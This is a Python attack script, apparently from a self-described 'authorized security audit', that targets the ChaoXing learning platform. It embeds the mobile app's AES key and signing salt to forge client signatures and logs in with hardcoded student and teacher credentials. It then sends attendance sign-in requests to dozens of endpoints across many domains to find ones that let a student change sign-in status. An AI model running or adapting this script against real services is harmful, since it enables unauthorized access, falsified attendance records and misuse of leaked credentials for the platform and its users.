#!/usr/bin/env python3
"""
Tier 5 Domain Exploration - ChaoXing Group/Home/Special Domains
Authorized Security Audit
"""
import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# Sign-in params
def get_sign_params(uid):
    return {
        "activeId": "5000163891319",
        "uid": uid,
        "courseId": "257485372",
        "classId": "132821141",
        "signType": "0",
        "clientType": "1",
    }

COMMON_SIGN_PATHS = [
    "/pptSign/updateSignStatus",
    "/pptSign/updateSignStatusByUidsV2",
    "/pptSign/refeashSignList4Json2",
    "/pptSign/stuSignajax",
    "/newsign/updateSignStatus",
    "/widget/sign/pcTeaSignController/updateSignStatus2",
    "/v2/apis/sign/signIn",
    "/sign/updateSignStatus",
    "/api/sign/updateSignStatus",
    "/mooc-ans/pptSign/updateSignStatusByUidsV2",
    "/mooc-ans/pptSign/refeashSignList4Json2",
    "/mooc-ans/newsign/updateSignStatus",
]

GROUP_PATHS = [
    "/group/sign/updateSignStatus",
    "/group/sign/stuSignajax",
    "/group/pptSign/updateSignStatus",
    "/group/pptSign/refeashSignList4Json2",
    "/groupsign/updateSignStatus",
    "/groupsign/stuSignajax",
]

HOME_PATHS = [
    "/home/sign/updateSignStatus",
    "/home/pptSign/updateSignStatus",
    "/mycourse/sign/updateSignStatus",
    "/mycourse/pptSign/updateSignStatus",
]

SPECIAL_PATHS = [
    "/special/sign/updateSignStatus",
    "/special/pptSign/updateSignStatus",
    "/activity/sign/updateSignStatus",
    "/activity/pptSign/updateSignStatus",
]

DOMAINS = [
    ("groupyd.chaoxing.com", "GroupDomain", GROUP_PATHS),
    ("groupweb.chaoxing.com", "GroupWebDomain", GROUP_PATHS),
    ("groupyd2.chaoxing.com", "groupweb2Domain", GROUP_PATHS),
    ("home-yd.chaoxing.com", "homeYdDomain", HOME_PATHS),
    ("home.yd.chaoxing.com", "homeDomain", HOME_PATHS),
    ("homewh.chaoxing.com", "homeWhDomain", HOME_PATHS),
    ("special.chaoxing.com", "specialDomain", SPECIAL_PATHS),
    ("special1.rhky.com", "special1Domain", SPECIAL_PATHS),
    ("special2.rhky.com", "special2Domain", SPECIAL_PATHS),
    ("special.rhky.com", "specialRhykDomain", SPECIAL_PATHS),
    ("specialpack.chaoxing.com", "SpecialPackDomain", SPECIAL_PATHS),
]

# Keywords indicating sign-in related response
SIGN_KEYWORDS = ["sign", "签到", "activeId", "activeid", "signStatus", "signstatus",
                 "updateSign", "stuSign", "success", "result", "status", "already"]

def is_sign_related(text):
    if not text:
        return False
    text_lower = text.lower()
    for kw in SIGN_KEYWORDS:
        if kw.lower() in text_lower:
            return True
    return False

def is_critical_response(text, path):
    """Check if response indicates student can modify sign-in status"""
    if not text:
        return False
    text_lower = text.lower()
    # Success indicators for sign-in modification
    critical_indicators = ['"result":1', '"result": 1', '"success":true', '"success": true',
                          '签到成功', '已签到', 'signsuccess', 'sign success',
                          '"status":1', '"status": 1', '"code":1', '"code": 1',
                          'updatesignstatus', '已修改', '修改成功']
    # Only for update/signIn paths
    update_paths = ["updateSignStatus", "signIn", "stuSignajax", "updateSignStatus2",
                    "updateSignStatusByUidsV2"]
    is_update = any(p in path for p in update_paths)
    if is_update:
        for ind in critical_indicators:
            if ind.lower() in text_lower:
                return True
    return False

def test_domain_base(domain):
    """Test base URL accessibility"""
    results = {"https": None, "http": None}
    for scheme in ["https", "http"]:
        url = f"{scheme}://{domain}/"
        try:
            r = requests.get(url, timeout=10, verify=False, allow_redirects=True,
                           headers={"User-Agent": get_mobile_ua()})
            results[scheme] = {
                "status": r.status_code,
                "accessible": r.status_code < 500,
                "redirect_url": r.url if r.url != url else None,
                "content_snippet": r.text[:300] if r.text else ""
            }
        except requests.exceptions.SSLError:
            results[scheme] = {"status": "SSL_ERROR", "accessible": False, "redirect_url": None, "content_snippet": ""}
        except requests.exceptions.ConnectionError:
            results[scheme] = {"status": "CONN_ERROR", "accessible": False, "redirect_url": None, "content_snippet": ""}
        except requests.exceptions.Timeout:
            results[scheme] = {"status": "TIMEOUT", "accessible": False, "redirect_url": None, "content_snippet": ""}
        except Exception as e:
            results[scheme] = {"status": f"ERROR: {type(e).__name__}", "accessible": False, "redirect_url": None, "content_snippet": ""}
    return results

def test_endpoint(session, domain, path, uid, scheme="https"):
    """Test a single endpoint with GET and POST"""
    url = f"{scheme}://{domain}{path}"
    result = {"path": path, "scheme": scheme, "get": None, "post": None}

    params = get_sign_params(uid)

    # GET request
    try:
        r = session.get(url, params=params, timeout=15, verify=False, allow_redirects=False)
        body = r.text[:1000] if r.text else ""
        result["get"] = {
            "status": r.status_code,
            "headers": dict(r.headers),
            "body": body,
            "sign_related": is_sign_related(body),
            "critical": is_critical_response(body, path),
        }
    except Exception as e:
        result["get"] = {"status": f"ERROR: {type(e).__name__}", "body": "", "sign_related": False, "critical": False}

    # POST request (form data)
    try:
        r = session.post(url, data=params, timeout=15, verify=False, allow_redirects=False)
        body = r.text[:1000] if r.text else ""
        result["post"] = {
            "status": r.status_code,
            "headers": dict(r.headers),
            "body": body,
            "sign_related": is_sign_related(body),
            "critical": is_critical_response(body, path),
        }
    except Exception as e:
        result["post"] = {"status": f"ERROR: {type(e).__name__}", "body": "", "sign_related": False, "critical": False}

    return result

def main():
    print("=" * 80)
    print("Tier 5 Domain Exploration - ChaoXing Group/Home/Special Domains")
    print("Authorized Security Audit")
    print("=" * 80)

    # Login student
    print("\n[*] Logging in as student...")
    stu_session, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"    Student PUID: {stu_puid}")
    if not stu_puid:
        print("    [!] WARNING: Student login may have failed, PUID empty. Using fallback 431407443.")
        stu_puid = "431407443"

    # Login teacher
    print("[*] Logging in as teacher...")
    tea_session, tea_puid = login("19712720708", "3.1415926Cpy")
    print(f"    Teacher PUID: {tea_puid}")
    if not tea_puid:
        print("    [!] WARNING: Teacher login may have failed, PUID empty. Using fallback 402644510.")
        tea_puid = "402644510"

    all_findings = []

    for domain, label, extra_paths in DOMAINS:
        print(f"\n{'=' * 80}")
        print(f"[*] Testing domain: {domain} ({label})")
        print(f"{'=' * 80}")

        domain_result = {
            "domain": domain,
            "label": label,
            "alive": False,
            "base_accessibility": None,
            "found_endpoints": [],
            "critical_endpoints": [],
            "interesting_findings": [],
        }

        # Step 1: Test base accessibility
        print(f"\n  [1] Testing base URL accessibility...")
        base_result = test_domain_base(domain)
        domain_result["base_accessibility"] = base_result

        https_ok = base_result["https"] and base_result["https"].get("accessible", False)
        http_ok = base_result["http"] and base_result["http"].get("accessible", False)

        if https_ok:
            print(f"    HTTPS: OK (status={base_result['https']['status']})")
            domain_result["alive"] = True
        else:
            print(f"    HTTPS: FAIL ({base_result['https']['status']})")

        if http_ok:
            print(f"    HTTP:  OK (status={base_result['http']['status']})")
            domain_result["alive"] = True
        else:
            print(f"    HTTP:  FAIL ({base_result['http']['status']})")

        # Determine which scheme to use for endpoint testing
        schemes = []
        if https_ok:
            schemes.append("https")
        if http_ok:
            schemes.append("http")

        if not schemes:
            print(f"    [!] Domain not accessible, skipping endpoint tests.")
            all_findings.append(domain_result)
            continue

        # Step 2: Build all paths to test
        all_paths = list(COMMON_SIGN_PATHS) + extra_paths
        # Deduplicate
        all_paths = list(dict.fromkeys(all_paths))

        print(f"\n  [2] Testing {len(all_paths)} endpoints with student session...")

        for path in all_paths:
            for scheme in schemes:
                ep_result = test_endpoint(stu_session, domain, path, stu_puid, scheme)

                get_status = ep_result["get"]["status"] if ep_result["get"] else "N/A"
                post_status = ep_result["post"]["status"] if ep_result["post"] else "N/A"

                # Only report non-404 and non-error results
                get_interesting = (isinstance(get_status, int) and get_status != 404) or \
                                  (isinstance(get_status, int) and get_status < 500 and get_status != 404)
                post_interesting = (isinstance(post_status, int) and post_status != 404) or \
                                   (isinstance(post_status, int) and post_status < 500 and post_status != 404)

                if get_interesting or post_interesting:
                    found_ep = {
                        "path": path,
                        "scheme": scheme,
                        "get_status": get_status,
                        "post_status": post_status,
                        "get_sign_related": ep_result["get"]["sign_related"] if ep_result["get"] else False,
                        "post_sign_related": ep_result["post"]["sign_related"] if ep_result["post"] else False,
                        "get_critical": ep_result["get"]["critical"] if ep_result["get"] else False,
                        "post_critical": ep_result["post"]["critical"] if ep_result["post"] else False,
                        "get_body": ep_result["get"]["body"][:500] if ep_result["get"] and ep_result["get"].get("body") else "",
                        "post_body": ep_result["post"]["body"][:500] if ep_result["post"] and ep_result["post"].get("body") else "",
                    }
                    domain_result["found_endpoints"].append(found_ep)

                    # Check for critical
                    if found_ep["get_critical"] or found_ep["post_critical"]:
                        domain_result["critical_endpoints"].append(found_ep)
                        print(f"    [!!! CRITICAL] {scheme}://{domain}{path}")
                        print(f"        GET: {get_status} | POST: {post_status}")
                        if found_ep["get_critical"]:
                            print(f"        GET body: {found_ep['get_body'][:200]}")
                        if found_ep["post_critical"]:
                            print(f"        POST body: {found_ep['post_body'][:200]}")
                    else:
                        # Non-critical but interesting
                        sign_info = ""
                        if found_ep["get_sign_related"]:
                            sign_info += " [GET:sign-related]"
                        if found_ep["post_sign_related"]:
                            sign_info += " [POST:sign-related]"
                        print(f"    [FOUND] {scheme}://{domain}{path} GET={get_status} POST={post_status}{sign_info}")
                        if found_ep["get_sign_related"] and found_ep["get_body"]:
                            print(f"        GET snippet: {found_ep['get_body'][:200]}")
                        if found_ep["post_sign_related"] and found_ep["post_body"]:
                            print(f"        POST snippet: {found_ep['post_body'][:200]}")

                        domain_result["interesting_findings"].append(found_ep)
                else:
                    # 404 or error - just note briefly
                    pass

        # Also test with teacher session on found endpoints
        if domain_result["found_endpoints"]:
            print(f"\n  [3] Re-testing found endpoints with teacher session...")
            for ep in domain_result["found_endpoints"]:
                path = ep["path"]
                scheme = ep["scheme"]
                ep_result = test_endpoint(tea_session, domain, path, tea_puid, scheme)
                get_status = ep_result["get"]["status"] if ep_result["get"] else "N/A"
                post_status = ep_result["post"]["status"] if ep_result["post"] else "N/A"
                ep["teacher_get_status"] = get_status
                ep["teacher_post_status"] = post_status
                ep["teacher_get_body"] = ep_result["get"]["body"][:300] if ep_result["get"] and ep_result["get"].get("body") else ""
                ep["teacher_post_body"] = ep_result["post"]["body"][:300] if ep_result["post"] and ep_result["post"].get("body") else ""
                print(f"    {scheme}://{domain}{path} Teacher: GET={get_status} POST={post_status}")

        all_findings.append(domain_result)
        time.sleep(1)  # Rate limiting

    # Summary
    print("\n" + "=" * 80)
    print("SUMMARY")
    print("=" * 80)

    for d in all_findings:
        print(f"\n--- {d['domain']} ({d['label']}) ---")
        print(f"  Alive: {'YES' if d['alive'] else 'NO'}")
        if d['found_endpoints']:
            print(f"  Found endpoints: {len(d['found_endpoints'])}")
            for ep in d['found_endpoints']:
                print(f"    - {ep['scheme']}://{d['domain']}{ep['path']}")
                print(f"      Student: GET={ep['get_status']} POST={ep['post_status']}")
                if 'teacher_get_status' in ep:
                    print(f"      Teacher: GET={ep['teacher_get_status']} POST={ep['teacher_post_status']}")
                if ep['get_sign_related'] or ep['post_sign_related']:
                    print(f"      ** Sign-related response detected **")
        else:
            print(f"  Found endpoints: 0")

        if d['critical_endpoints']:
            print(f"  CRITICAL endpoints: {len(d['critical_endpoints'])}")
            for ep in d['critical_endpoints']:
                print(f"    [CRITICAL] {ep['scheme']}://{d['domain']}{ep['path']}")
                print(f"      GET critical={ep['get_critical']} POST critical={ep['post_critical']}")
                if ep.get('get_body'):
                    print(f"      GET body: {ep['get_body'][:200]}")
                if ep.get('post_body'):
                    print(f"      POST body: {ep['post_body'][:200]}")
        else:
            print(f"  Critical endpoints: 0")

    # Save full results to JSON
    output_file = "/workspace/tier5_results.json"
    with open(output_file, "w", encoding="utf-8") as f:
        json.dump(all_findings, f, ensure_ascii=False, indent=2, default=str)
    print(f"\n[+] Full results saved to {output_file}")

if __name__ == "__main__":
    main()
